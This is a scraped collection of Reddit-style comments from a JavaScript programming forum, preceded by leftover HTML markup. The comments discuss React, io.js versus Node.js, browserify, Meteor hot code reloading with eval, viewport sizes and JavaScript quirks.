&lt;/tr&gt; &lt;tr&gt;&lt;/tr&gt; &lt;tr&gt;&lt;/tr&gt; &lt;tr&gt;&lt;/tr&gt; &lt;tr&gt;&lt;/tr&gt; &lt;tr&gt;&lt;/tr&gt; &lt;tr&gt;&lt;/tr&gt; &lt;tr&gt;&lt;/tr&gt; &lt;tr&gt;&lt;/tr&gt; &lt;tr&gt;&lt;/tr&gt; &lt;tr&gt;&lt;/tr&gt; &lt;tr&gt;&lt;/tr&gt; &lt;tr&gt;&lt;/tr&gt; &lt;tr&gt;&lt;/tr&gt; &lt;tr&gt;&lt;/tr&gt; &lt;tr&gt;&lt;/tr&gt; &lt;tr&gt;&lt;/tr&gt; &lt;tr&gt;&lt;/tr&gt; &lt;tr&gt;&lt;/tr&gt; &lt;tr&gt;&lt;/tr&gt; &lt;tr&gt;&lt;/tr&gt; &lt;tr&gt;&lt;/tr&gt; &lt;tr&gt;&lt;/tr&gt; &lt;tr&gt;&lt;/tr&gt; &lt;tr&gt;&lt;/tr&gt; &lt;tr&gt;&lt;/tr&gt; &lt;tr&gt;&lt;/tr&gt; &lt;tr&gt;&lt;/tr&gt; &lt;tr&gt;&lt;/tr&gt; &lt;tr&gt;&lt;/tr&gt; &lt;tr&gt;&lt;/tr&gt; &lt;tr&gt;&lt;/tr&gt; &lt;tr&gt;&lt;/tr&gt; &lt;tr&gt;&lt;/tr&gt; &lt;/tbody&gt; &lt;/table&gt; &lt;script&gt;&lt;/script&gt; &lt;div class="block_actions"&gt;&lt;/div&gt; ::after &lt;/div&gt; &lt;/div&gt; &lt;form id="run_query" style="margin:0px;0px;0px;0px" name="run_query" method="POST" action="/?nd=vms_query_report"&gt;&lt;/form&gt; &lt;script type="text/javascript"&gt;&lt;/script&gt; &lt;/div&gt; &lt;!-- close #content .wrapper --&gt; &lt;/div&gt; &lt;!-- close #content --&gt; &lt;/div&gt; &lt;!-- &lt;div id='sub'&gt; &lt;ul id='subcontent'&gt; &lt;li class=… --&gt; &lt;div id="footer"&gt;&lt;/div&gt;
This was one of the best versions I've seen.
It's interesting that the page claims it's treacherous, when now that there's more data it's normalized around what you'd expect.
for me it pretty much went like... - 2000: 640 - 2005: 800 - 2010: 960 - 2015: 1080 first number is the year, second number is the width.
Two way data-binding is very convenient, but thats about it, in my book. I like to be more deliberate in my approach, but it does cause more code.
&gt; You also say that "many" sites use this solution but fail to provide examples. Who uses it? how many users can they actually support? Can/do they scale? The fact that you have to ask this question gives me doubts about your level of exposure to this concept. I think you're taking a position without enough information, and I think you'd be better off re-evaluating if you're making a fair assessment. There's no doubt, even in the minds of people who are not proponents of the architecture, that apps written using client-side JS patterns have proven scalable and maintainable when created correctly. I'll give you two off the top of my head: Facebook is intentionally refactoring much of their site to use React, moving logic from server to client, see [dev talk on using React in Facebook's architecture](https://code.facebook.com/videos/786462671439502/react-js-conf-2015-keynote-introducing-react-native-/) [Windows Azure portal is built entirely as a client-side SPA using Knockout.js](https://manage.windowsazure.com/), also see [dev talk on SPA architecture for Windows Azure - they appear to be quite happy with it.](http://blog.stevensanderson.com/2014/06/11/architecting-large-single-page-applications-with-knockout-js/) &gt; Just because you dont like PHP, it doesn't automatically make it a bad solution. I don't need to speak personally on this topic, the fact that tech leaders (both companies and individuals) have been moving away from PHP for the last several years is an indication of this truth. &gt; The original article even touches on the fact that Twitter moved back towards a traditional client/server model because it was better for the end user. There is an important lesson there. What is good for the user may not always be good for the devs, but we gotta suck it up because we make software for users not ourselves. As I mentioned, both architectures are valid and have pros and cons. Twitter may have found that their needs, given a variety of factors, are better suited to an MVC or similar architecture. Your single example supports the claim that MVC architectures are still relevant and sometimes advantageous, but does nothing to validate your comment that client-side JS-based architectures are "unnecessary" or "bad". 
No, they don't. The above file is most likely a downloader trojan.
Dev tools emulator? 
Definitely possible and sometimes necessary, check out these things called [portals](https://github.com/ryanflorence/react-training/blob/gh-pages/lessons/05-wrapping-dom-libs.md). The example there used jQuery UI
can you create a plunker or a jsfiddle?
I don't think so.
Ok... Is that because you don't understand them? These are all common terms that have well defined meanings, that are generally widely agreed upon as good thing, but here goes: * composition: components are just Javascript functions and are therefore composable. Yup, that *is* a very major selling point or 'marketing talk'. It's sort of important. * unidirectional data flow: react eschews two way data binding common in mvc frameworks. Again, core premise and should be obvious what it means. * DSLs: look ma' no ng-repeat! * explicit mutation: again props and state handed down the call stack. I pray implicit vs explicit mutation and why one is favorable over the other doesn't require further expounding or there is probably no reason to continue and... * static mental model: I will give in this is slightly more complex if you've not read any other sentences about react or looked at code snippets. If you have, it means your rendered method doesn't change. You feed it different states and the render method knows how to render itself for all possible States. Ultimately, this is the biggest value proposition of react. So, yes this lists all of reacts most important features in language we use every day and does in a way that immediately shows how it's different than current mvc frameworks. So I guess in the sense that it describes react's strong suits it is indeed 'marketing talk' 
The message is: Do not trust the numbers anyone gives you as typical viewport size and be flexible. Don't hardcode it. Can we just go with the same assumption about viewport width? 
I have a monitor in portrait mode at work. SO many sites can't handle that. Even Reddit gets a bit shitty at times.
How would it change your design if they were evenly distributed across the entire range shown, from 300 to 5100? Do that. That's taking into account the diversity.
The fold appears to be a 502 error.
a general note; you should use path.join( ) to create file paths from its component parts to make the code OS-portable. For example, write path.join(vendorPath, "jquery") instead of vendorPath + '/jquery' as the file path seperator differs between Windows and UNIXs. Sorry if this is already known to you, and you just chose to do otherwise for some reason. 
You can use browserify-shim's ~~[global](https://github.com/thlorenz/browserify-shim#a-expose-global-variables-via-global) option~~ for this. Or you could use a second build step that concats the bundle and libs. 
But by using the global option wouldn't I still have 2 script tags? And therefore 2 requests? And I have no reason to use the library once the IIFE has been invoked. I have thought about using a second build step that would just concat the bundle and the other libs but wanted to know if I was missing something much simpler.
Mirror?
As someone still getting used to Node.js (after 3 years of trying not too hard), can someone ELI5? I don't get all the references.
I think that you do want to shim it and require it in the main app. After all, if foundation is a requirement for your app to run...its a dependency and should be bundled.
Anything that gets TJ to sub tweet is worth it. https://twitter.com/tjholowaychuk/status/564986298490839042 Come back TJ. /s
[**@tjholowaychuk**](https://twitter.com/tjholowaychuk/) &gt; [2015-02-10 03:16:45 UTC](https://twitter.com/tjholowaychuk/status/564986298490839042) &gt; Someone was really bored haha ---- ^This ^message ^was ^created ^by ^a ^bot [^[Contact ^creator]](http://www.reddit.com/message/compose/?to=jasie3k&amp;amp;subject=TweetsInCommentsBot)[^[Source ^code]](https://github.com/janpetryk/reddit-bot) 
I am the 502 Bad Gateway
It looks like the most promising option so far. Is there a way to encapsulate the functionality of props into a single reusable object, like a node in a node graph? 
io.js formed out of nodejs. Their main focus is the open governance model because they complained that Joyent (the maintainer) of nodejs is too sluggish and protective and therefore changes arent getting out fast enough. A good example is the fact that nodeJS hasnt reached version 1.0 (currently at v0.12) under the SemVar versioning the first digit when it's 0 mean's it's unstable according the standard and that anything can change; however, nodejs is used and depended on in multiple enterprise environments and where it's beyond stable (it should probably be at 2.0 now) 
Why is this not written in ES6 or ES7 for that matter? On a serious note, does it work well? If so who cares. I mean it is only a gulp file and is not client facing. There are many more things that I would try and focus on perfecting first.
I Am the Bad Gateway! I'm a naughty gate.
Windows still recognises paths with / though, doesn't it? I mostly use path.join myself but don't remember having any problems with just / either. 
#####&amp;#009; ######&amp;#009; ####&amp;#009; [**Naked objects**](https://en.wikipedia.org/wiki/Naked%20objects): [](#sfw) --- &gt; &gt;__Naked objects__ is an [architectural pattern](https://en.wikipedia.org/wiki/Architectural_pattern_(computer_science\)) used in [software engineering](https://en.wikipedia.org/wiki/Software_engineering). &gt; --- ^Interesting: [^Apache ^Isis](https://en.wikipedia.org/wiki/Apache_Isis) ^| [^Naked ^Objects ^MVC](https://en.wikipedia.org/wiki/Naked_Objects_MVC) ^| [^Dark ^nebula](https://en.wikipedia.org/wiki/Dark_nebula) ^| [^Naked ^eye](https://en.wikipedia.org/wiki/Naked_eye) ^Parent ^commenter ^can [^toggle ^NSFW](/message/compose?to=autowikibot&amp;subject=AutoWikibot NSFW toggle&amp;message=%2Btoggle-nsfw+cogtyhl) ^or[](#or) [^delete](/message/compose?to=autowikibot&amp;subject=AutoWikibot Deletion&amp;message=%2Bdelete+cogtyhl)^. ^Will ^also ^delete ^on ^comment ^score ^of ^-1 ^or ^less. ^| [^(FAQs)](http://www.np.reddit.com/r/autowikibot/wiki/index) ^| [^Mods](http://www.np.reddit.com/r/autowikibot/comments/1x013o/for_moderators_switches_commands_and_css/) ^| [^Magic ^Words](http://www.np.reddit.com/r/autowikibot/comments/1ux484/ask_wikibot/)
Lost it after `This community is as idiotic as JavaScript itself`
&gt; Philip Guo &gt; &gt; 1:02 AM (29 minutes ago) &gt; &gt; to pythontutor-us. &gt; Jeff, it's your lucky day :) I just spent the past month creating an official version of the JavaScript visualizer and just uploaded it to the live site: &gt; &gt; http://www.pythontutor.com/visualize.html#py=js &gt; &gt; &gt; The reason why that other prototype (created over 3 years ago by someone else as a prototype) has been taken off the site. Try it out and please spread the word!
New address: &gt; Philip Guo &gt; &gt; 1:02 AM (29 minutes ago) &gt; &gt; to pythontutor-us. &gt; Jeff, it's your lucky day :) I just spent the past month creating an official version of the JavaScript visualizer and just uploaded it to the live site: &gt; &gt; http://www.pythontutor.com/visualize.html#py=js &gt; &gt; &gt; The reason why that other prototype (created over 3 years ago by someone else as a prototype) has been taken off the site. Try it out and please spread the word!
Could a similar result not be achieved by writing local anonymous functions?
It could be achieved in many way, I just like the let block syntax the most. Seems to read the most naturally to me.
Can you better explain what you are trying to accomplish? It sounds like you want to edit the code before `eval`uation? You can `eval` in a whole host of contexts/environments; some with access to the DOM and some not: * global (targeting the host window or other accessible window objects) * local closure (with or without a `this` context) * useStrict (with or without a `this` context) * isolated (under a iFrame either sandboxed or not) as well as JSON parsing (if you're only looking at POJOs). I've put together a nice wrapper library for `eval`ing here: http://github.com/campbeln/evaler/ . I haven't documented it yet, but you can see it in use under another project: https://github.com/campbeln/CjsSS.js
Thanks for the tip! I always use slash even though I'm using Windows and have never come across an error actually.
Wow, why didn't I think of this!?. These are the droids i'm looking for! Thank you so much
Please don't sacrifice readability and conciseness for mostly negligible performance improvements, which probably only make sense if you're writing a library.
Eh?
I have added little more clarification about what I am trying to do. I can eval code just fine, context is almost always global in my case so it's not a problem. I have to analyse the code before execution, for which I am relying on regular expressions at the moment and am not quite sure if it's the best way of doing that. And yes I need to edit the code sometime before evaling it. For analysis and edit part I was asking if some tool (like esprima or some other) would be help better. 
It works. Just had a job interview and they asked me about task runners, so I decided to learn. I didn't see its benefits yet but It seems they are one of the popular things in the industry.
They're pretty much the same. Development on io.js is just more active.
As a language, JavaScript has a lot of quirks that don't make any sense. A lot of features like ==, NaN, undefined and typeof are unpredictable in their behavior, because JavaScript is not very consistent. This is why half of being a JavaScript developer is learning how to use JavaScript and the other half is how not to use it.
Probably not the answer you are looking for, but I recently started using http://datatables.net/ to populate / manipulate tables. Makes sorting, paging, searching easy.
It would probably help if OP would just explain the framework they're working with. From the code given, it's pretty clear that they're using Meteor. Meteor automatically hot reloads the application when JavaScript and HTML files are changed, and live injects stylesheets when CSS files are changed. It sounds like OP wants to extend the live-injection to JS and HTML, so that the app doesn't auto-refresh on code changes, but rather evals the new code in the background, overriding whatever code it changed. `Template` is one of Meteor's major components, and the `events` function is a method of template objects. So OP can't override `events`. The expected, documented functionality of calling `events` twice is to register new event handlers in addition to the existing ones. More importantly if I understand correctly, `events` doesn't actually immediately register events - it just declaratively tells Meteor what events need to be delegated whenever a new instance of a given template is created. Also, certain things such as trying to register a `Template` with the same name twice will cause an exception. The bigger problem is that even if OP can maintain all these internal state modifications for Meteor, users of OP's Meteor package may have other library dependencies that will throw up when you try to do the same thing twice. TL:DR; OP wants to do code migrations whenever a file changes so that the new code can be live injected into the browser and (at least some) of the known effects of removed code can be reverted.
unfortunatly i'm not sure how it would help with the table i have now (which im wanting to keep) 
Plus as its being loaded afterwards im not sure if it would help.
If you want to use two-way binding, you have to use isolate scope with `=`: { scope: { yourModel: '=yourAttribute' }, link: function(scope) { var value = scope.yourModel; // read scope.yourModel = 'test'; // write } }
I can't get you a copy of React Native, but in the meantime, I'd encourage you to try out Tabris.js - same purpose (native mobile apps), only in pure JavaScript. It'll take you not more than 3 minutes to set up: http://eclipsesource.com/blogs/2015/02/03/mobile-app-development-in-javascript-three-minute-tutorial/ Beer/coffee still welcome :)
This puts OPs question in a different perspective. 
@ChiperSoft No minAjax is nothing new , i needed a lightweight code to perform some sort of things on my web page so i made small thing according to my needs , there were no intentions like "oh wow! i made something new", i thought i should share this tool with friends online :) so nothing big ! Cheers 
http://codepen.io/anon/pen/pvpbLR
Ok. You try and implement a fullscale webapp without classes OR pointers. Feel free! Have fun with that
[Here's one](https://github.com/hassankhan/emojify.js/blob/master/gulpfile.js) from my project, it's quite long (I'm completely open to feedback/suggestions/PRs though). Hope it helps :)
I've thought about doing something like this before but have never gotten around this. Let me describe the approaches I can imagine. First of all, you may or may not know that V8 can do hot code-swapping for you. Depending on your needs, there might be some way for you to leverage this. You can look up setting up Workspaces to learn a little about this. Once a user has set up a workspace, the promise is that you can just edit a file and the browser will automatically pick up the changes. And there are ways to integrate with this programmatically as a browser extension or through the remote debugging protocol (which is what Brackets does). The cons to this approach are that workspaces are pretty buggy in my opinion, and you have to jump through a bunch of hoops, and even if you jump through all the hoops, if the API doesn't support something you want you're probably SOL unless you have too much time and your hands and want to hack on Blink. But depending on your needs this might be the right path. There's another option: you can instrument your code. (I describe this approach a little bit [here](https://github.com/omphalos/earhorn).) When you instrument your code, you can grab references to all the functions in the code. (I would use esprima or acorn for something like this, not RegEx.) You can then instrument each of these references with a wrapper function. The wrapper function would just call into some kind of data structure, lets call it the functionCache, which tracks the up-to-date version of each function and calls it with something like `return functionCache[id].apply(this, arguments)`. Then you can swap any function reference by replacing its id in the functionCache. You could do this whenever the user edits a file for example. There is a bit more work to do if you use this approach. When the user edits code, you need to be able to say things like "this function that was over here has now been moved to over there". That lets you determine when a function is the same function, or a new one, and thus whether to allocate a new id in the functionCache or re-use an existing one. For tracking these kinds of differences, there are two approaches I can imagine; first maybe using google's [diff-match-patch library](https://code.google.com/p/google-diff-match-patch/), or else, if you're using CodeMirror, you can inject TextMarker objects (I believe they're called) as trackers which follow the open-bracket and close-bracket characters associated with each function around in the editors as you edit the document. Overall, this approach is quite a bit involved. The third option I can imagine, which really depends on having a certain kind of opinionated framework, is having a layer which the user has to talk to to register their functions. For example, in [mercury](https://github.com/Raynos/mercury), the rendering function is stateless, and to use it, you just pass it to mercury's `app` function. So you could be really narrow in what you let the user do, you can say, "hey if you want to use the tool I made you need to have a file that returns me a mercury render function." So the user provides you a render function, and you can store the reference, then you pass a wrapper to mercury which just calls the reference. When the user edits their render function, you just update the reference with the latest eval'ed version. This last approach is definitely the least complicated, but it really depends on tying your code to a framework that work a certain way. The [Elm Debugger page](http://debug.elm-lang.org/) is a good reference for how people have approached it this way and gotten something pretty amazing working -- the source language is not JavaScript however. 
I switched, but tbh I don't really think of it as a "switch". I am choosing to stay on the side of the most active Node developers, regardless of the name of the project.
&gt; DOM DocumentFragment Depends on the browser. A lot of browsers can do an innerHtml parse faster than they can do the dom fragment thing. &gt; While wears it better The test omits basic for loops. Also, I'm not convince that for..of loops are going to be all that slow (even if they are now). &gt; Keep your scopes close and your scope even closer This is mostly bad advice. Most Javascript JITs will do everyone of the optimizations mentioned in this blob for you. In particular, saving off a function reference at a lower scope may actually decrease performance.
True, but also don't value developer comfort over end product and/or user. FWIW nothing in the post sacrificed readability or conciseness and all looked like good practice to me.
I never found it funny once :(. Still, I kind of wonder if Germans have an equivalent video for someone speaking another language.
Didn't you watch the video? /s Also, learning IO and Node is pretty much the same.
The return of progressive enhancement! Except this time, we have better-defined ways to create the base experience and build further on the same components to add the client side enhancements when JavaScript runs there, hooking the client-only stuff up for free. React and react-router are already most of the way there today and Ember is heading there.
Thank you for this. I was really confused about the video.
It's not difficult to do without classes. The "pointers" part I'm not sure I understand.
Isomorphic JavaScript is a very exciting concept to me, but I have a question based on the linked article. I get that the markup is generated on the server then delivered, then the static JavaScript is delivered, but how are the bindings and variables in memory that are dynamically created passed to the browser? For example, say on page load my app fetches the todo list models and renders the templates. Cool, all that markup is rendered on the node side and pushed to the browser. But, what about the bindings for the todo list buttons that are bound by a promise after successful model fetch that will now not happen in the client? Or what about some token that's set as a property of an object on page load? TL;DR: I get how markup is prerendered and passed, but how do events and variables get passed?
IO = NodeJs + Features. They explicitly want to be backwards compatible with nodejs. Hopefully they will remerge back into NodeJs and Joyent will stop being a big baby. Being "NPM Compatible" means that any feature in node should work in IO.js if not file a report. https://iojs.org/en/faq.html
bro, do you even triple equals? Using strict for life! 
Thanks, With Edge I can see the changes in the real enviroment??
Maybe you're right, but what about the designers and common people who don't know about coding?
&gt; Python has bundler Bundler is part of the ruby ecosystem (gemfiles are part of bundler), not Python. Python has pip. 
They either learn how to code or work with people who know how to code. The same way it has been for ever. 
No, the problem is not that they are unpredictable. They are certainly predictable, if you know what they do and how they do it, they are even consistent. The problem is that what they do is at odds with the way most other languages do them. It can be extremely surprising coming from other languages.
Missing semicolons. var X1=int var X2=int There's no `parsefloat()`. There's only `parseFloat()`. X1=parsefloat(X1); Check the Error Console or JavaScript Console in your browser to see the error messages when your code is not working.
&gt; Imagine the animation over time once you had some historical data. Slowly getting bigger, then shrinking drastically. :P
`typeof null === "object"` is probably what uusu is referring to. Not _unpredictable_ so much as _astonishing_.
So delicious. 
If that doesn't work, which operating system?
I downvoted; if you're going to be a dick, you need to at least be right. I build large business applications for a living ([here is a screenshot of one of them to ground the discussion](http://curator-lilita-10664.bitballoon.com/work-area-metadata.png)). This particular app's frontend was written in React.js and has, i dont know, maybe 10 things that maybe you could call a "class", nearly all of those were due to interfacing with dependencies like KendoUI. Anywhere where someone tried to pass a reference to something mutable was scrutinized for review and I think if it happened it was due to interfacing with a dependency. (Not essential complexity)
If you want to, you can. But it's not meant to be a separation from node. io.js was primarily forked because of the copyright issue with Joyent. To ease up the patching process it was forked for convenience. All the io.js contributors are node's core team. It's just different name with a different governance. 
whoops my mistake! 
Xamarin is a bad idea, I have used it and there's things that shouldn't be so slow. Like a httpclient on ios(xamarin) has a big delay, I had to write a wrapper to avoid that issue, but was like 50 ms the wrapper vs 350 ms xamarin implementation. Go with native, titanium or ionic, but take care with xamarin.
Its more unintuitive than unpredictable
I guess you are implying it won't matter :)? imagine doing this 3000 times in a 1M lines project, still it won't matter?
They could use a Chinese dub, if one exists.
Good thing IO.JS got out of its way already.
As others have said, it won't impact performance. There are two scenarios: 1. The code is cold and currently being interpreted by V8 / Spidermonkey. If the function is rarely hit, then it will remain cold, but that function is being rarely hit anyway so it's not performance critical and the fact that you're making a function call will be negligible. 2. The code is hot and has been JIT Compiled. If the function is being hit over and over, then the tracer will see that this is an opportunity to inline or compile to machine code. The extra function call will be optimized away in any places that the call is performance critical, and will no longer be present.
I'll be going with react native in the future I hope. It's just important to recognise xamarin if you're considering cross platform options.
Thanks for the insightful reply. Third approach is what I am headed for. Thing I am developing is totally platform dependent. It's an editor that is meant to work only on one framework. I wasn't naming the framework because I didn't want a framework bias (I've seen people shying away when frameworks are named). It is meteor package. For the editor I am developing another package which handles hot-code push. In the github is a hackish proof-of-concept that hot code push in meteor is possible. I am refining it now. My problem at the moment is mainly the analysis of the code. Relying on regexps is not very robust in fact. My present plan is to identify the code that might cause problems in hot-pushing (evaling) the code, and take some measure to neutralise it. My present conception is that I can't cover all the possible cases for the code that might break when re`eval`ed. So I am thinking about implementing a way to let users easily plug in detectors and neutralisers for their code. Or I will just pipeline the code and tell users to neutralise it for their cases and give it back to me for `eval`ing. In either case, I am looking for the best ways to analyze the code for detection, and then filtering it if required. I am relying on regexps and basic text processing for now, but I'll look into your instrumenting code when I wake up, to see if it can help me somehow. 
I can statically compile scheme and still have all of the dynamic features. 
what do you mean?
They should have mentioned that io.js was the motivation behind all this corporate garbage talk. I didn't see them mentioning anything about the issues Node has right now. 
Nice!!! I'll try. Thanks
Could this be a saving grace for node? Wasn't Joyent's dictatorship-ish management of node one of the main reasons for creating io.js? This would address that (although I prefer the open governance model of io.js) and the corporate backing could also be a big advantage. 
You got it. I didn't want to add a framework bias, so I was avoiding naming the framework. To my delight, I have achieved HTML hot code push pretty successfully (as per little testing I could do). Here's the POC for hot-code push which I am refining now. The present functionality relies on meteor to tell it to refresh, and instead of refreshing it eval all the js and update. This make the hot-push rather slow (it waits till meteor rebuilds the app and say "refresh"). But since my I am building it for my in-browser ide Nucleus I am taking a slightly different approach now. I am just taking the raw code, compile it myself (in case of HTML) and make it come in effect. This is easy to do for Nucleus as all the code is already present in browser, but is certainly not very difficult to do from native text editors. You can test this if you like by using `LiveUpdate.refreshTemplate(htmlCode)` if you like. Next thing I am targeting is Javascript code. I am aiming to get the stock Meteor code `eval`ing without a problem. I believe it might not be possible for me to cover all the cases where code breaks/do something funny when evaled twice, so I am thinking about implementing a way to let users easily plug in detectors and neutralisers for their code. Or I will just pipeline the code and tell users to neutralise it for their cases and give it back to me for evaling. In either case, I am looking for the best ways to analyse the code for detection, and then filtering it if required. For example, for Template events code, I am planning to detect if the file being evaled has code for events, then detect which Templates and then remove all the existing events on the template (neutralise the code), and eval the file. This will add restriction that all the events for a particular template must be placed in same file, but I am ready to make this sacrifice to achieve the greater goal, for now at least. 
I don't think type safety is enough payoff for writing and reading all that extra code. Wading through boilerplate means the important stuff takes longer to find and grok. Code should be as human-friendly as possible.
&gt; also if i remember correctly, Pip isnt even installed initially with Python False, pip is shipped with Python, although only recently for Python 2.x &gt;and to install someone's packages in a project &gt; npm install I guess it's a fewer amount of key presses compared to pip install -r requirements.txt &gt;Secondly, learning from Python and Ruby's mistake of having to copy the ENTIRE environment in order to move your packages from project to project nodeJS supports both local PER PROJECT dependencies and Global PER NodeJS installation dependencies. Errrr virtualenv?
typeof always gives back lc strings as the return value https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/typeof at least _thats_ consistent
thanks!
Just because it's a foundation does not mean there is going to be an open governance model. Joyent is catering to large corporations, but they should also be catering to all the core Node.js dev who are unhappy with their stewardship. Without them Node.js will stagnant and io.js will flourish.
There's nothing blind about it. Learn your history. It's only been three years since Microsoft came off the Justice Department's 12-year oversight, which had been extended by two years when Microsoft didn't comply with their obligations as the 10-year oversight was coming to an end. And when it did, some of their shenanigans started up again. And let's not forget what happened in the EU, too.
javascript has the lowest entry point of all the languages so it naturally attracts a lot of idiots
charming! ;)
still havent explained why this is applicable here
Too little, too late. 
http://jsperf.com/function-or-immediate12345
I should have said *could*, not *would* address that. By going after the corporate backings, Joyent is starting to make it very clear that they want nothing to do with io.js and its philosophies. It will be interesting to see how this all plays out 
Everything Microsoft touches turns into a turd.
I always knew "the fold" was bullshit.
No you're thinking oracle.
And another clueless redditor thinks that's all there was to it.
I didn't write it, quite easy to see that by the name on the piece. And he is not the one being the jerk here. 
Yeah, their sudden rushing 0.12 out plus this load of political crap is mostly them wanting to protect their status as the Node.js community. They could have done this ages ago, and they're probably only doing it now, because io.js has forced their hand.
I wonder - will this be the killer feature that allows React to steal Angular's lunch?
I'm just sticking with node.js until all of this dies down. I don't want to adopt a new platform for production systems that might die off.
I guess you're one of those people who don't think corporations can lie. 
Did you get a chance to look at my answer to that SO question?
you're a pot of honey, thank you!
Too tiny, too tardy.
&gt; Depends on the browser. A lot of browsers can do an innerHtml parse faster than they can do the dom fragment thing. A DocumentFragment isn't for added parsing speed, the benefit of them is preventing a crap tonne of reflows occurring in your page. If you use innerHtml to insert a lot of elements into your page, it might parse faster, but you're going to have a really bad trip when you see the amount of reflows you are causing. &gt; This is mostly bad advice. Most Javascript JITs will do everyone of the optimizations mentioned in this blob for you. In particular, saving off a function reference at a lower scope may actually decrease performance. Most Javascript JIT's will handle cases like this for you within reason. It is foolish to assume that the browsers Javascript rendering engine is going to always have your best interests at heart. There are definitely negligible differences between locally scoping your variables and functions compared to not locally scoping them, I believe this fact is mentioned in the article. I can't see how this is bad advice though, it might not be entirely important if you scope local or not, but it can help in particular instances. I thought it was common sense to always within reason locally define variables and functions to prevent pollution, I have been doing this by habit for as long as I can remember.
&gt; I can't see how this is bad advice though, it might not be entirely important if you scope local or not, but it can help in particular instances. Sure, variables and functions should be scoped as locally as possible. However, You shouldn't save off references to globally scoped variables/functions in the hopes of getting better performance. You aren't going to get better performance by doing that.
+1 Hopefully both sides will realize that they are being babies. Neither side has been particularly grown up.
I think iends means that probably a press release shouldn't be taken at face value. Oracle, by example, also has an ["open governance"](http://arstechnica.com/information-technology/2010/12/apache-resigns-from-jcp-in-protest-of-oracle-governance-failures/) model for Java.
if your server has unified their error message responses, then it becomes easy. I just did this the other day: $http.get(url) .then(function(data){ //do something w/ data }) .catch(utils.errorHandler);
I'm in the same camp. I'm using 6to5 until everything blows over.
Thank you. This approach makes a lot of sense and seems obvious in hindsight. Do you find that you use any particular approaches for organizing these changes within a project? Do you find yourself trying to keep all library modifications in a single file, separate files for each, or an approach more coupled with the actual implementation?
This is my sentiment exactly. 
This book is the best one for people who know they will never be great designers, but just want to hack something out that looks ok: http://bootstrappingdesign.com/
Thanks :) My SO account is self-sustaining at this point (I get about 100 rep/day, top 0.5%/day for doing nothing, lol)
Had I read this a few weeks ago I would have said something like "Either way, the plan is to merge io.js with joyent/node once io.js is finished getting all it's updates and features in." However, I don't think joyent will be accepting any improvements from io.js :(
People who want node to be better can continue working on/with io.js while joyent and Microsoft try to retain customers with money.
As someone who is just getting his feet wet with Backbone, this served as an excellent introduction. Thank you!
Have you followed Java? It becomes committee politics and new features take forever.
C# has been under MS control since it's inception, and I wouldn't call it's feature adoption rate exactly "slow". (See the upcoming C# 7 feature proposals) Also, java is what it is by design, according to it's defenders, and that is a good thing (they say)
Combine it with https://github.com/auduno/clmtrackr and it would improve significantly.
Don't you? Why is that? It's in Joyent's interests for io.js to merge back into Node, because it makes Node more appealing to enterprise and then Joyent can sell more support contracts.
Oh my god that lip miming. 
[TIL](http://www.sciencebasedmedicine.org/left-brain-right-brain-myth/)
yeah, same here. Module owners having to support both is going to be a major pain in the long run.
Even though this is only happening because io.js is out, I'm still glad that they are finally doing it. My biggest fear now is that io.js never actually gets merged back into node and they just fork in two very different directions. Wouldn't be the end of the world, but it is confusing.
What's in Joyent's best interest isn't always what Joyent does. That's why io.js exists in the first place. I think it's a legitimate worry that they'll continue to stagnate.
oooooh! snap!
It is about damn time. Why Joyent didn't do this like two years ago when adoption of Node was at an all time high sure beats me. I wonder if this will mean faster development pace? Hopefully. Joyent kind of knew they had to do something after the io.js fork happened and high-profile contributors jumped ship to the fork. We will have to wait and see if the foundation results in a more diplomatic governance model or if this is merely Joyent saving face and creating a foundation that will be powerless to actually do anything. I think Node.js can still turnaround. I didn't jump ship for io because I knew Joyent would have to react and personally, having to support two forks is a pain in the butt and damaging to the community. Can't we all just get along?
A little to the left ... that's good *pushes button*
post the same issue on both iojs/io.js and joyent/node and then come back in a few hours and tell me who is cooler. iojs is making a serious effort to stay current and move forward (v8 and es6 support) while joyent/node is simply kind of lazy and trying to appease some vague notion of consistency that appeals to non-technical tech managers which requires that they shut out all sorts of legitimate community support and concern.
There are two aspects of designing a user interface which you need to consider. 1) graphic design, and 2) interaction design. The first one is what most people consider to be "designing interfaces". i.e. making it look pretty and choosing colours. If your goal is to create something which people can productively use and want to use, then point 1 isn't really all that important; interaction design is. There are plenty of pretty looking interfaces which are terrible to use. The good news is that for graphic design you can just grab something like bootstrap and it will look pretty. The good news for point 2, interaction design, is that you can learn and usefully apply a lot of the principles after a bit of study. Interaction design has little to do with art skills and a lot to do with cognitive psychology. There is a logic to be learnt and exploited regarding how people read and interpret information on a screen (or in the world in general). ["About Face"](http://www.amazon.com/About-Face-Essentials-Interaction-Design/dp/1118766571/ref=sr_1_1?s=books&amp;ie=UTF8&amp;qid=1423646936&amp;sr=1-1&amp;keywords=about+face) was a great book in the past and I assume it is still worth a read now in this latest edition. ["The Design of Everyday Things"](http://www.amazon.com/Design-Everyday-Things-Revised-Expanded/dp/0465050654/ref=sr_1_1?s=books&amp;ie=UTF8&amp;qid=1423647031&amp;sr=1-1) is less about computers but is a classic book and should get you thinking about people interact with objects. That is just a start. There are other books of course which more directly deal with design on the web. 
This reminded me of that time when we implemented entire text editing/selection in Fabric.js (all rendered on canvas, naturally) — http://fabricjs.com/test/misc/itext.html
Do you do overpriced consulting?
Not sure I understand your question correctly, but assuming color1, color2 and color3 are RGB values, you would just do fill(100, 100, 100); To call the fill function. If you wanted to say, randomise the colors, use Math.random() to generate values. 
I'm a bit surprised to learn that AtScript doesn't have a compiler which statically checks types at the moment. Does anyone like the idea of using runtime checking? I don't. Also, using assert.js to define what is basically an interface (Quackable) looks horrid. Is there no support for a real interface declaration? Right now, my impression is that AtScript's current implementation is far behind their ambitions. (Does anyone know what custom metadata looks like in AtScript?) 
I think this is a fantastic way to sum of the situation.
All these webcam tech demos are really cool and all, but.. where are the online multiplayer first person shooters with no plugins? What are we waiting for, folks!?
Io.js here I come. 
JSCS is great indeed. I'm using it on both Fabric.js (https://github.com/kangax/fabric.js/blob/master/.jscs.json) and html-minifier (https://github.com/kangax/html-minifier/blob/gh-pages/.jscsrc) and since it's hooked to Travis, it's one of the best ways to ensure clean and consistent PR's on your open source projects (without telling people what to fix and where).
yeah, you are exactly right. They have a section specifically about that on their blog post. Their application ended up being a hybrid between DOM and canvas rendering.
&gt;What more do you need The Javascript, perhaps? Other than the bit in the `onfocus` attribute, you haven't shown us any script at all.
I really wish that JSCS (technically, Esprima) would support ES6 syntax. Can't use it in my current project as-is. Fortunately Webstorm does support syntax and style checks while I'm editing my code.
I dont think these projects have the same goals. React-canvas isn't trying to replace DOM controls with canvas controls.
